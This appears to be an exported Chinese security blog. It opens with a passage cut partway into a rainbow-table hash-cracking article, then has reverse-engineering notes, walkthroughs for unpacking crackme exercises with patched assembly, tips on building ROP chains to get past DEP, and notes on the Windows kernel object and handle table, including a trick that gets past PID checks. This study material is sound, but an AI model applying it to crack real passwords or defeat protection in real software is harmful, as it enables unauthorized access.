<h3 id="查表过程"><a href="#查表过程" class="headerlink" title="查表过程"></a>查表过程</h3><p>&ensp;&ensp;&ensp;&ensp;如果已经有了上文图一中生成的彩虹表，怎样找到hash函数H的一条密文re3xes对应的明文呢？解释这个破解过程需要明确一点：如果re3xes对应的明文属于彩虹表中的某条链，那么就有可能找到其对应的明文，注意这里的“属于某条链”不仅仅是指属于彩虹表的一条链中存放的头尾两个字符串，还包括这两个字符串中的中间数据，图一中中间计算的明文数据secret、jimbo也算是属于彩虹表的第一条链中，同理bernie、zurich属于第二条链，culture、crypto属于最后一条链，虽然彩虹表中只保存了每条链的链首链尾两个字符串，但是这些中间数据是可以根据链首字符串重新计算出来的。来看一下re3xes的破解过程，先猜测下密码re3xes对应的明文数据是某条链中间计算出数据的最后一个，注意第一、二条链的中间数据中的最后一个明文口令jimbo、zurich，依次经过H-R3运算得到保存的链尾字符串rootroot、myname，那么密文re3xes经过R3转换之后得到的数据就是某条链的链尾字符串，这点应该不难理解，如密文v0d$x对应的明文jimbo是第一条链最后一个中间明文数据，则v0d$x经过R3转换得到链尾字符串rootroot，但是密文re3xes经过R3函数转换之后得到的rambo并不是表中保存的任一条链的链尾字符串，这就说明re3xes对应的明文数据并不是某条链中间计算出数据的最后一个，猜测不成立，继续猜测re3xes对应的明文数据可能是某条链中间计算出数据的倒数第二个，同样可以很容易推出re3xes依次经过R2-H-R3转换之后得到的数据是某条链的链尾字符串，计算出re3xes经R2-H-R3转换的结果为linux23，通过搜索彩虹中存放的链尾字符串，得到linux23恰好是最后一条链的链尾，O(∩_∩)O~，到了这一步已经成功了一大半，下面就来根据存储的最后一条链链首的passwd重新计算出密文re3xes对应的明文吧，既然re3xes经R2-H-R3转换之后得到链尾的linux23，那么链首的passwd经H-R1-H运算后的结果culture就是re3xes对应的明文啦，小功告成~(≧▽≦)/~，流程图见下图2。
<center>
    <img style="border-radius: 0.3125em;
    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
    src=图2.jpg>
    <br>
    <div style="color:orange; border-bottom: 1px solid #d9d9d9;
    display: inline-block;
    color: #999;
    padding: 2px;">图2 彩虹表破解密码示意图</div>
</center>
<p>&ensp;&ensp;&ensp;&ensp;注意：经过这种运算能得到链尾字符串的话只是成功了大半，还是有一小半人品不好的情况额，如果Rk函数设计的不好，存在一个密文字串qshud和re3xes经过R2-H-R3运算后都能得到linux23，那么在破解密文qshud的时候也会得出明文为culture，这种错误的情况称为“假警”，因为实际应用中的数据量都比较大，所以出现这种情况也是很正常的，这是只需要简单计算一下hash验证下即可，从另一个角度看数据量大的同时也能保证彩虹表的明文覆盖率更大，破解效果更好，出现“假警”情况的话就继续查表过程直至找到正确的明文或是找完整个表也没找到明文╮(╯_╰)╭……
<p>&ensp;&ensp;&ensp;&ensp;ps：彩虹表类似于用大量随机字符串来保证对明文的覆盖率，所以Rk系列函数的构造直接影响能破解密码的范围。

<h2 id="彩虹表的不足与改进"><a href="#彩虹表的不足与改进" class="headerlink" title="彩虹表的不足与改进"></a>彩虹表的不足与改进</h2><h3 id="不足：加盐情况处理不好"><a href="#不足：加盐情况处理不好" class="headerlink" title="不足：加盐情况处理不好"></a>不足：加盐情况处理不好</h3><p>&ensp;&ensp;&ensp;&ensp;现在很多加密方法计算密码Hash时，会在待处理的明文字符串后面加上一串随机的字符串再进行加密操作，开始密码验证时会先在用户输入的密码后加上相同的随机字串进行加密，结果再与存储的Hash进行比较。如明文口令是qshud，则附加上一段随机字符串再计算hash，正确口令的hash存储时也是这样的处理过程，这样做的一个好处就是可以在一定程度上防止彩虹表破译，假设随机字符串为“！@#￥”之类的特殊符号，在造表的过程中设计R函数就需要考虑到映射回这些特殊符号，这就大大增大了造表的空间和难度。

<h3 id="不足：不能保证100-破解"><a href="#不足：不能保证100-破解" class="headerlink" title="不足：不能保证100%破解"></a>不足：不能保证100%破解</h3><p>&ensp;&ensp;&ensp;&ensp;造表过程中可以很明显的看出，只有明文字符串属于彩虹表的某条链上才能保证这条明文对应的Hash可以被破解，然而设计的再好也不能保证能够破解所有对应的Hash密码，实际中破解率99%以上就已经很实用了。

<h3 id="改进：破解率100-的雷表"><a href="#改进：破解率100-的雷表" class="headerlink" title="改进：破解率100%的雷表"></a>改进：破解率100%的雷表</h3><p>&ensp;&ensp;&ensp;&ensp;上文已经提到了破解的效率并不能达到100%，而雷表就是对这点的改进，据称可以达到100%的破译，但是涉及的技术会更加复杂。目前这项技术还未被公开，网上也找不到详细的介绍。

<h3 id="改进：显卡并行编程加速造表过程"><a href="#改进：显卡并行编程加速造表过程" class="headerlink" title="改进：显卡并行编程加速造表过程"></a>改进：显卡并行编程加速造表过程</h3><p>&ensp;&ensp;&ensp;&ensp;利用显卡多核的特点，设计并行的造表算法（CUDA并行编程），一般情况下能将造表速度提至7倍（以我一个很水的实现为起点~囧）或更高。

<h2 id="彩虹表下载及相关工具"><a href="#彩虹表下载及相关工具" class="headerlink" title="彩虹表下载及相关工具"></a>彩虹表下载及相关工具</h2><h3 id="免费彩虹表下载："><a href="#免费彩虹表下载：" class="headerlink" title="免费彩虹表下载："></a>免费彩虹表下载：</h3><p>&ensp;&ensp;&ensp;&ensp;Free Rainbow Tables：http://www.freerainbowtables.com/en/tables/，提供了LM、NTLM、MD5、SHA1等彩虹表下载。

<h3 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h3><p>&ensp;&ensp;&ensp;&ensp;Opcrack：有自己独特的彩虹表结构，支持LM，NTLM破解。
<p>&ensp;&ensp;&ensp;&ensp;RainbowCrack：可以自己造表，支持LM, NTLM, MD5, SHA1, MYSQLSHA1,              HALFLMCHALL, NTLMCHALL的破解。
<p>&ensp;&ensp;&ensp;&ensp;Cain：由Oxid.it开发的一个针对Microsoft操作系统的免费口令恢复工具。号称穷人使用的L0phtcrack……]]></content>
      <categories>
        <category>密码算法</category>
      </categories>
      <tags>
        <tag>彩虹表</tag>
        <tag>Hash算法</tag>
      </tags>
  </entry>
  <entry>
    <title>2014-01-05-逆向笔记【壹】</title>
    <url>/2014/01/05/2014-01-05-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0%E3%80%90%E5%A3%B9%E3%80%91/</url>
    <content><![CDATA[<ol>
<li><p>常见压缩壳：UPX、ASPACK、NSPACK。</p>
</li>
<li><p>常见加密壳：Asprotect、Zprotect、Yoda、Telock、Svkp。</p>
</li>
<li><p>常见虚拟机保护壳：Vmprotect、Themida、WinLicense 。</p>
<a id="more"></a></li>
<li><p>常用动态调试工具：ollydbg、Immunitydbg、Windbg，其中ollydbg使用最多，逆向必备，Immunitydbg为Immunity公司对ollydbg之后的改进版，支持Python脚本，但是断点不能保存，更适合漏洞利用领域，Windbg界面不甚友好，但是微软自家的东西对windows系统支持很好，调试内核驱动程序必备，三者都支持自定义脚本编写。</p>
</li>
<li><p>常用静态分析工具：Win32Dasm、Ida pro，Win32Dasm已经停止更新了，Ida功能更强更常用，结合hex插件反编译出C程序代码的效果极佳哦。</p>
</li>
<li><p>Peid是目前最常用的查壳类型的工具，内置有外壳特征库及识别算法，也可以自己下载特征库自制查壳工具。</p>
</li>
<li><p>DeDe是逆向分析Delphi及Brond C++程序的利器，可以看到窗体及其它资源的信息，还可以查看对应按钮等的处理程序，便于快速定位分析。</p>
</li>
<li><p>机器码：用二进制代码表示的计算机能直接识别和执行的一种机器指令的集合，一般反汇编出的结果为16进制显示，如空指令nop的机器码为90（16进制）;</p>
</li>
<li><p>断点：调试器的功能之一，可以让程序中断在需要的地方，常用的断点包括：INT3断点（也称软断点）、硬件断点（利用CPU的调试寄存器设置）、内存断点（利用操作系统的缺页异常处理机制）、消息断点、条件断点等。</p>
</li>
<li><p>硬件断点利用CPU的调试寄存器，最多只能设置4个，在软断点被检测的多时下硬件断点和内存断点也是极好的。</p>
</li>
<li><p>调试器的单步跟踪是结合的调试器软断点机制，在调试器中实现的逐指令或逐过程执行程序。</p>
</li>
<li><p>父进程：指已创建一个或多个子进程的进程，调试器如Ollydbg一般使用打开或附加的方式调试程序，调试器就作为调试程序的父进程，一般正常的应用程序是由explorer.exe创建的，父进程就是explorer.exe等，可以利用这个特点做反调试。</p>
</li>
<li><p>堆栈平衡定律：手工脱壳时利用外壳程序首先需要保存原程序的入口信息（寄存器、堆栈使用情况等），通过标记刚加载时入口点的堆栈位置，等外壳程序恢复原程序的ESP寄存器值的时候，一般就到了OEP位置附近。</p>
</li>
<li><p>内存访问断点：根据操作系统的内存管理机制，经常未使用的内存页不会放置在缓存中，当程序需要访问到该页内存时就会触发缺页异常，就会交给调试器处理，而外壳程序完成原程序各个区段的解压操作之后会跳转到原程序开始执行，在使用Ollydbg调试器手工脱壳时，可以手工设置内存访问断点，当程序解压完某个区段之后会自动中断在缺页异常处，再进行单步跟踪就能到达OEP处。</p>
</li>
<li><p>shellcode：一段完成特定功能的代码，一般用于获取主机权限，常见的有新建用户、弹出消息框（测试用）、绑定端口等，与溢出漏洞联系紧密，经常在利用漏洞获取程序控制权之后执行得到被攻击主机的部分权限。</p>
</li>
<li><p>网页挂马一般利用浏览器或其插件在解析特定网页过程中的漏洞控制浏览器程序流程执行shellcode（一般为反弹连接或是下载并执行恶意程序的功能），用户在使用浏览器访问不明链接时就可能成为被控制的“肉鸡”，现在国内主机WindowsXp+IE8的仍然占很大分量，很危险(⊙o⊙)哦，Windows7下则安全的多。</p>
</li>
<li><p>软件加壳过程一般是将原程序的代码数据等压缩或加密处理，在程序中新建一个区段存放外壳代码，并修改程序入口使外壳部分代码先于原程序开始执行，在完成原程序数据的解压缩或解密之后再跳转到原程序的代码执行。</p>
</li>
<li><p>内存偏移地址：也叫VA，在保护模式下程序被加载到内存后，操作系统为其分配了自己独立的4GB虚拟内存空间，在这个空间定位的地址就称为虚拟内存地址，范围为0×00000000~0xffffffff，相对于0×00000000的偏移称为内存偏移地址。</p>
</li>
<li><p>区段：也可以称为“节”、“区块”，用于存放可执行程序不同类型数据的地方，如代码段、数据段、资源段等，将程序的数据放置在不同的区段可以设置不同的权限便于管理，实际存放的数据类型或区段名称可以根据根据需要灵活设置。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>原理</tag>
      </tags>
  </entry>
  <entry>
    <title>2015-04-01-吾爱破解脱壳练习笔记</title>
    <url>/2015/04/01/2015-04-01-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%84%B1%E5%A3%B3%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>主要记录吾爱破解脱壳练习集的部分练习过程及脱壳方法总结，对关键点记录备忘，实际上脱壳需要看壳所具体开启的保护措施（如穿山甲及Pespin的Debug-Block）。除穿山甲及部分壳记录遗失或未记录外整体总结不够完整，还有三四款未做深入研究，待有需求时再做记录补充。</p>
</blockquote>
<p>6 ：telock笔记<br>方式一：<br>最后一次异常法记录最后一次异常的位置，然后设置代码段内存访问断点。运行即在OEP处断下，dump之后使用importrec的telock插件修复即可。</p>
<a id="more"></a>
<p>方式二：<br>如果要是想手工绕过IAT加密，可以在程序运行之后查看IAT的起始位置，重新运行程序，在程序已经执行过硬件断点检查之后再设置对IAT的硬件读或访问断点。<br>运行到类似指令：<br>004698E7    8B85 53384000   mov eax,dword ptr ss:[ebp+403853]<br>004698ED    40              inc eax<br>004698EE    0F84 A8000000   je UnPackMe.0046999C<br>004698F4    80A5 FC2F4000 F&gt;and byte ptr ss:[ebp+402FFC],0FF<br>004698FB    0F84 9B000000   je UnPackMe.0046999C<br>00469901    80A5 FD2F4000 F&gt;and byte ptr ss:[ebp+402FFD],0FF<br>00469908    0F84 8E000000   je UnPackMe.0046999C<br>将004698FB及00469908处的je改成jne即可，再代码节断点结合最后一次异常法即可到OEP，之后就不用修复导入表了。</p>
<p>8 ：molebox：<br>用oep定律可以直接到oep，但是这样的话importrec的修复不好。<br>手工绕过IAT加密的方法如下：<br>记录被加密的IAT地址，如dd 455170，设置硬件访问断点，在一次赋值之后断下：<br>00455170  7C801D53  kernel32.LoadLibraryExA<br>从此开始单步跟踪，不取消断点：<br>00471666    FF15 40D84700   call dword ptr ds:[47D840]               ; kernel32.VirtualProtect<br>0047166C    85C0            test eax,eax<br>0047166E    75 0A           jnz short UnPackMe.0047167A<br>00471670    B9 0B0000EF     mov ecx,EF00000B<br>00471675    E8 9D2F0000     call UnPackMe.00474617<br>0047167A    8B4D 08         mov ecx,dword ptr ss:[ebp+8]<br>0047167D    8B55 F8         mov edx,dword ptr ss:[ebp-8]<br>00471680    8B02            mov eax,dword ptr ds:[edx]<br>00471682    8901            mov dword ptr ds:[ecx],eax<br>到了此处之后将00471682处修改IAT的指令给nop掉。到了oep之后dump即可。</p>
<p>9 : CRYPToCRACk：<br>手工绕过IAT加密的方法如下：<br>记录被加密的IAT地址，如dd 45512c。设置硬件访问断点：<br>00468331    5A              pop edx                                  ; UnPackMe.0045512C<br>00468332    59              pop ecx                                  ; UnPackMe.0045512C<br>00468333    5B              pop ebx                                  ; UnPackMe.0045512C<br>00468334    8B7C24 04       mov edi,dword ptr ss:[esp+0x4]           ; UnPackMe.00468384<br>00468338    893C8A          mov dword ptr ds:[edx+ecx<em>4],edi         ; UnPackMe.00468384<br>0046833B    807F 05 55      cmp byte ptr ds:[edi+0x5],0x55<br>在0046833B断下，修改00468338为mov dword ptr ds:[edx+ecx</em>4],eax，并新建eip即可绕过IAT加密。<br>同样ESP定律到达OEP。有时候会到达OEP的下一条指令。手工简单修复下堆栈及寄存器即可。</p>
<p>10 : pespin笔记：<br>记录esp值如12ffc4，给VirtualProtect下memory access断点，可以看到有检查CC断点，不用管继续运行到VirtualProtect调用。运行到返回之后给之前的ESP-4=12ffc0值设置硬件访问断点。<br>断下来之后单步可见到以下形式的stolen code：<br>oep format:<br>xxx<br>jmp to yyy<br>yyy<br>jmp to zzz<br>记录并修复入口即可。</p>
<p>13：GHF Protector笔记<br>给VirtualAlloc和VirtualProtect下断点，很快就可以到达第二层壳的位置，再利用ESP定律就可以到达真正的OEP，用LoadPE进行Dump时需要取消勾选 《完整转存：从磁盘粘贴文件头》  再用importrec修复时需要注意取消勾选《活动进程信息 使用来自硬盘的PE头》。</p>
<p>14及18：Armadillo穿山甲<br>其实对OpenMutex函数下断，更改其第二次打开同名互斥量返回值即可快速将双进程变单进程，看到的其它方式略复杂。</p>
<p>15: ACProtector<br>内存访问断点，直接两次到OEP，修复即可。</p>
<p>16：Acprotect<br>内存访问断点，注意第一个下到原程序的数据段，第二个下到原程序代码段。不宜下到壳的段（第15个也类似）。</p>
<p>17：PEBundle<br>ESP定律直接到OEP：<br>修复IAT时候看无效IAT的栈地址，重新运行下硬件访问断点。<br>单步不久看到此处判断是否加密IAT，je改成下图的jmp<br>00471FBF    85C0            test eax,eax<br>00471FC1    EB 25           jmp short UnPackMe.00471FE8<br>00471FC3    51              push ecx<br>od的自带就可以修复。</p>
<p>19：PUNiSHER<br>data-code访问断点，断下后获取导入函数地址再运行到：<br>003C0890   /EB 33           jmp short 003C08C5</p>
<p>009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]<br>009F0234    50              push eax<br>009F0235    64:8925 0000000&gt;mov dword ptr fs:[0],esp<br>009F023C    83EC 68         sub esp,68<br>009F023F    53              push ebx<br>009F0240    56              push esi<br>009F0241    57              push edi<br>009F0242    8965 E8         mov dword ptr ss:[ebp-18],esp<br>009F0245    33DB            xor ebx,ebx<br>009F0247    895D FC         mov dword ptr ss:[ebp-4],ebx<br>009F024A    EB 04           jmp short 009F0250</p>
<p>009F02B7    90              nop<br>009F02B8    FF15 7C214000   call dword ptr ds:[40217C]               ; msvcrt.<strong>set_app_type<br>009F02BE    59              pop ecx<br>009F02BF    830D 3C314000 F&gt;or dword ptr ds:[40313C],FFFFFFFF<br>009F02C6    830D 40314000 F&gt;or dword ptr ds:[403140],FFFFFFFF<br>009F02CD    FF15 78214000   call dword ptr ds:[402178]               ; msvcrt.</strong>p__fmode<br>009F02D3    8B0D 30314000   mov ecx,dword ptr ds:[403130]<br>009F02D9    8908            mov dword ptr ds:[eax],ecx<br>009F02DB    FF15 74214000   call dword ptr ds:[402174]               ; msvcrt.<strong>p</strong>commode<br>009F02E1    8B0D 2C314000   mov ecx,dword ptr ds:[40312C]<br>009F02E7    8908            mov dword ptr ds:[eax],ecx<br>009F02E9    A1 70214000     mov eax,dword ptr ds:[402170]<br>009F02EE    8B00            mov eax,dword ptr ds:[eax]<br>009F02F0    A3 38314000     mov dword ptr ds:[403138],eax<br>009F02F5    EB 04           jmp short 009F02FB</p>
<p>009F0301    E8 06000000     call 009F030C</p>
<p>009F0360    FFD4            call esp</p>
<p>20：未知壳<br>00401F39   .  E8 8AFEFFFF   call UnPackMe.00401DC8                   ; \CreateProcessA</p>
]]></content>
      <categories>
        <category>脱壳破解</category>
      </categories>
      <tags>
        <tag>telock</tag>
        <tag>molebox</tag>
        <tag>CRYPToCRACk</tag>
        <tag>pespin</tag>
        <tag>GHF Protector</tag>
        <tag>ACProtect</tag>
        <tag>PEBundle</tag>
        <tag>PUNiSHER</tag>
      </tags>
  </entry>
  <entry>
    <title>2014-02-28-逆向笔记【贰】</title>
    <url>/2014/02/28/2014-02-28-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0%E3%80%90%E8%B4%B0%E3%80%91/</url>
    <content><![CDATA[<ol>
<li>PE文件各区段解释(区段名称跟功能没有必然关系，这里只是说明常见的定义)：</li>
</ol>
<ul>
<li>.code或.text段：存放程序的代码数据。</li>
<li>.data段：存放程序运行使用的数据。</li>
<li>.rdata或.idata段：程序的导入表数据。</li>
<li>.edata段：程序的导出表所在的节。</li>
<li>.rsrc段 :程序资源节，为多层的二叉排序树，节点指向PE文件的各种类型资源（图标、对话框、菜单等）。</li>
<li>.reloc段：重定位表所在的节，实际加载基址改变之后，程序里的有些数据（如部分全局变量等）地址是写死的，程序加载时将这些数据的地址更新，重定位表就用来存放需要重定位的数据信息。<a id="more"></a></li>
</ul>
<ol start="2">
<li><p>Windbg界面不怎么友好（看雪提供有Windbg高亮插件），且Windbg刚加载程序时是在系统断点处断下的，可以载入程序之后在命令行设置断点bp $exentry，再运行就会在程序的入口点断下的。</p>
</li>
<li><p>将Windbg设置为默认调试器的方法为在命令行转到Windbg程序的目录下，输入Windbg –I，如果Windbg.exe的目录已经添加到了系统环境变量里，就不用再Cd进Windbg程序的目录了。设置默认调试器可以在程序出现异常时自动挂载程序到出异常的位置，在调试漏洞Poc时非常有用，如果Poc触发了异常就会自动调用Windbg到出问题的代码处。</p>
</li>
<li><p>Windbg进行本地内核调试时需要将系统的调试开关打开，命令为：bcdedit -debug on ，重启生效，同理：bcdedit -debug off为关闭调试开关。</p>
</li>
<li><p>使用Windbg进行源代码调试驱动程序时必须首先安装与系统相对应的符号文件，如果驱动程序对应的源码名称为QS2HU4.c，在驱动的入口设置断点的命令为bp QS2HU4!DriverEntry，其中QS2HU4为源码文件名、DriverEntry为驱动的入口函数名（相当于C程序中的Main函数），使用WinDbg打开QS2HU4.c文件之后再加载驱动，就会在源码中DriverEntry函数哪一行断下。（Windbg根据符号文件找出DriverEntry函数位置~）。</p>
</li>
<li><p>Windbg调试驱动程序出现蓝屏时，可以根据提示输入并执行!analysis -v，查看系统崩溃的详细信息，比如错误码C0000005代表非法内存访问等，虽然也能将定位到出现错误的源代码中的行或具体的某句汇编指令，但是情景复杂的情况往往需要进行栈回溯等等方法寻找出错的根源。</p>
</li>
<li><p>Windbg中查看错误码含义的指令为!error 错误码。例如!error  2。</p>
</li>
<li><p>栈溢出主要有覆盖返回地址、覆盖虚表指针、覆盖SEH异常处理链表等形式。</p>
</li>
<li><p>堆溢出一般发生在指针拆卸出错，可造成固定地址写任意数据、任意地址写固定数据、任意地址写任意数据等，目前此类型漏洞在Windows系列操作系统中发生的不多，在xp sp2之前的操作系统可以通过向系统关键地址处如进程控制块中的指针等。Ps：路由器操作系统中利用堆溢出漏洞进行拒绝服务攻击甚至是远程代码执行还很常见。</p>
</li>
<li><p>为了绕过Windows xp sp2及以上操作系统的dep保护机制，可以利用Immunity Debugger调试器的mona插件可以自动生成Rop链（好像是findantidep插件的升级版），当然可能还需要进行手工调试修正，首先把mona插件的python脚本下到手之后放到Immunity Debugger的plugin目录下即可。</p>
</li>
<li><p>在Immunity Debugger的命令行输入!mona rop -m msvcr71.dll -n（前提是笔记十）。-m选项代表从后面的msvcr71.dll中获取rop链，-n代表过滤掉null byte，也就是“\X00”,避免Rop数据被类似strcpy的字符串拷贝函数拷贝时被截断出错，命令执行之后就可以得到ruby、python等各种语言格式的Rop链啦~</p>
</li>
<li><p>在使用Immunity Debugger的mona插件时，注意生成的Rop链中如果带有Ascll字样，代表构成Rop的这些数组的每一个字节的十六进制值都是小于0x80(128)的，也就是在Ascll字符表示范围内，使用这种Rop链的一个好处就是可以避免MultiByteToWideChar和WideCharToMutiByte函数对输入数据的ANSIC与宽字符之间的转换，如果漏洞利用调试过程中自己的利用代码出现了类似的小意外不妨从这里找找原因。</p>
</li>
<li><p>IDA：有时候感觉用IDA的图形视图看汇编代码真是一种享受，不过IDA的强大之处还不止此，不仅可以对字符串、函数找到其交叉参考（查看该字符串或函数的调用情况，便于追根溯源），还有出色的代码标注功能及N多强大的插件(⊙o⊙)哦，比如：hexray……</p>
</li>
<li><p>IDA的hexray插件功能非常强大，可以将汇编代码反编译成的类c语言的伪代码，用法也非常简单：在某调用函数反汇编代码的图形视图按下F5键就有惊喜(⊙o⊙)哦（在反汇编代码视图中光标选定位置F5之后就会得到光标所在函数的反编译代码），这技术还不是非常成熟，但是IDA反编译出的结果还算准确，测试时可以把int 3指令反编译成debugbreak()。（最好不要滥用该技能，建议老老实实的看汇编代码，慢慢打基础）。</p>
</li>
<li><p>IDA以静态反汇编出名，也可以进行调试分析的，看菜单工具栏选项或F9快捷键体验一下吧，个人感觉效果、功能虽不如od的动态调试，图形视图下的调试还算不错的，结合Windbg调试就更爽了。。。</p>
</li>
<li><p>如果一些窗体程序使用起来不合你的胃口，比如说对话框太小了、图片太丑了，先不用考虑放弃这个程序，试试ResHacker、eXeScope等资源编辑工具吧，操作简单，还能将一些灰色按钮的限制功能取消掉（找到相应的属性，修改之后再Rebuild），也是进行汉化操作等的利器。</p>
</li>
<li><p>程序加载到内存时需要根据导入表的结构将程序运行所需要的API函数地址填充到IAT（导入函数地址表）的地址，程序运行时导入表的结构是用不到的，所以一些外壳程序会把导入表结构销毁掉，如果在脱壳过程中对其进行Dump内存镜像的操作之后，得到的程序就没有导入表结构，无法提供程序运行时的API地址信息，导致出错。这也就是为什么Dump内存镜像之后要进行导入表修复操作。</p>
</li>
<li><p>硬件断点：常用的CPU都有8个调试寄存器Dr0-Dr7，其中Dr0-Dr3用于存放设置硬件断点的地址（所以硬件断点最多只能设置四个），Dr4-Dr5一般用于保留，Dr6-Dr7用于指示硬件断点的设置个数及属性（读、写中断）等。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>原理</tag>
      </tags>
  </entry>
  <entry>
    <title>2015-12-18-内核对象结构简介</title>
    <url>/2015/12/18/2015-12-18-%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;内核对象包括多种进程对象、文件对象等等，应用层每次创建或打开进程、文件都会对相应的内核对象创建一个句柄（进程的pid值其实就是该进程内核对象的句柄），这个句柄其实就是一个索引值，在通过句柄操作内核对象时，由内核根据该句柄值查找句柄表，定位内核对象的位置，最终完成相应操作。
</blockquote>
<a id="more"></a>
<p>&ensp;&ensp;&ensp;&ensp;系统所有有名的内核对象按散列表的方式保存在ObpRootDirectoryObject指针指向的对象目录表中：

<p><img src="%E5%9B%BE1.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中HashBuckets数组每个元素都指向一个_OBJECT_DIRECTORY_ENTRY结构：

<p><img src="%E5%9B%BE2.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;ChainLink指向下一个_OBJECT_DIRECTORY_ENTRY结构，Object表示所存放的内核对象，HashValue则是其散列值。因为对象目录本身也是一种内核对象，在Windbg中可以直接查看该对象详细信息，下图中可以看出!object可以列出对象目录信息及Hash表中不为空的表项。在编程实现遍历对象目录时需要注意递归调用遍历函数，避免遗漏，其实编程遍历对象目录的结果和WinObj查看的结果印象里是一样的。

<p><img src="%E5%9B%BE3.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;下面以进程对象为例介绍内核对象结构，进程的内核对象地址指的就是进程的_EPROCESS结构（文件内核对象指的是_FILE_OBJECT结构,其它对象都有相应的结构），下面先来看看explorer进程的_EPROCESS结构：

<p><img src="%E5%9B%BE4.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;部分结构：

<p><img src="%E5%9B%BE5.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;因为不同内核对象类型所对应的结构都不一样，为了方便识别内核对象类型，所有内核对象头部前0x18字节存放内核对象头信息：

<p><img src="%E5%9B%BE6.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;注意偏移0xC偏移处的TypeIndex成员，代表内核对象类型所在类型表中的偏移，在vista以前的系统上，_OBJECT_HEADER中是没有该成员的，而是直接存放一个_OBJECT_TYPE结构表示对象类型。所以在Win7及以上系统就需要根据索引值在全局符号变量ObTypeIndexTable中定位对象所指示的类型，可以看到_OBJECT_TYPE中Name字符串表示是进程对象：

<p><img src="%E5%9B%BE7.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;这和直接查看进程对象类型指针得到的地址也是一样的：

<p><img src="%E5%9B%BE8.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在处理其他内核对象时也可以根据这种方式判断出所要处理的对象类型是什么，不过在编写相关程序时需要注意要根据特征搜索出ObTypeIndexTable地址，如果是调试时可以直接在Windbg中直接根据_EPROCESS结构直接查看对象类型：

<p><img src="%E5%9B%BE9.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中HandleCount和PointerCount分别表示句柄和内核对象的引用计数。
<p>&ensp;&ensp;&ensp;&ensp;最后需要注意下_OBJECT_TYPE类型的TypeInfo结构的其他成员：

<p><img src="%E5%9B%BE10.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;其中OpenProcedure等相关结构可以指定打开进程也就是OpenProcess时调用的回调函数，替换之后也可以做到很多事情，比如监控进程创建等。
]]></content>
      <categories>
        <category>系统内核</category>
      </categories>
      <tags>
        <tag>内核原理</tag>
        <tag>系统机制</tag>
      </tags>
  </entry>
  <entry>
    <title>2015-12-19-句柄与句柄表结构简介</title>
    <url>/2015/12/19/2015-12-19-%E5%8F%A5%E6%9F%84%E4%B8%8E%E5%8F%A5%E6%9F%84%E8%A1%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;这里说的句柄指内核对象的句柄，窗口句柄hWnd等是另外的管理结构，不牵扯内核对象，系统的句柄表主要有三种，第一种是系统全局PspCidTable句柄表，保存所有进程和线程的句柄，第二种是进程内部句柄表，保存该进程所打开的内核对象句柄，最后一种是系统进程system的全局句柄表，这几种句柄表对应的格式都是一样的。
</blockquote>
<a id="more"></a>
<h2 id="句柄表结构及PspCidTable"><a href="#句柄表结构及PspCidTable" class="headerlink" title="句柄表结构及PspCidTable"></a>句柄表结构及PspCidTable</h2><p>&ensp;&ensp;&ensp;&ensp;以PspCidTable句柄表为例查看句柄表结构，该句柄表存放所有进程、线程的句柄：

<p><img src="%E5%9B%BE1.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;TableCode为0x8f122001，后三位值1代表是二级表（0为一级表、2为三级表）。WindowsXP及以上系统都是采用的动态3层句柄表，句柄数超过一级表的容量时，就会扩展为二级表，此时二级表中放的是指向一级表的指针，这个TableCode的值去掉后三位的值0x8f122000指向一级表基址，如图0x8f122000地址存放了两个一级表的指针：

<p><img src="%E5%9B%BE2.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在一级表0x8a204000中存放的每个_HANDLE_TABLE_ENTRY结构占8字节，前四个字节0x865ccab1去掉后三位标志位之后的0x865ccab0即指向一个_EPROCESS结构（其实是system进程对象）：

<p><img src="%E5%9B%BE3.jpg" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;为嘛句柄表中第一个结构对应的是System进程？在我Win7系统上System进程的PID值为4。因为句柄值的低两位用来用来存储该索引对应的句柄表的层次，所以实际的句柄值都是4的倍数，除以4才能得到在句柄表中的实际索引，同样如果已知一个句柄值，也可以据此定位到该句柄所对应句柄表中的位置，每个句柄表最多能存储0x800=2048个_HANDLE_TABLE_ENTRY结构，如果给定Handle值为0x804，可以计算得到该句柄对应第0x804/0x800=2个句柄表项的第(0x804-0x800)/4=1个索引,选择刚才看到的两个一级表指针数组的第二个0x8f102000，一个_HANDLE_TABLE_ENTRY占8个字节，从而定位到句柄0x804对应的_HANDLE_TABLE_ENTRY，查看该对象属性可以确认句柄0x804对应的是一个线程对象：

<p><img src="%E5%9B%BE4.jpg" alt=""><br><img src="%E5%9B%BE5.jpg" alt=""></p>
<blockquote>
<p>TIPS: 实际的句柄值都是4的倍数，如果给OpenProcess等函数构造PID值5/6/7，实际上打开的进程还是PID=4的system进程，这样有时可以绕过一些限制打开PID的检查。</p>
</blockquote>
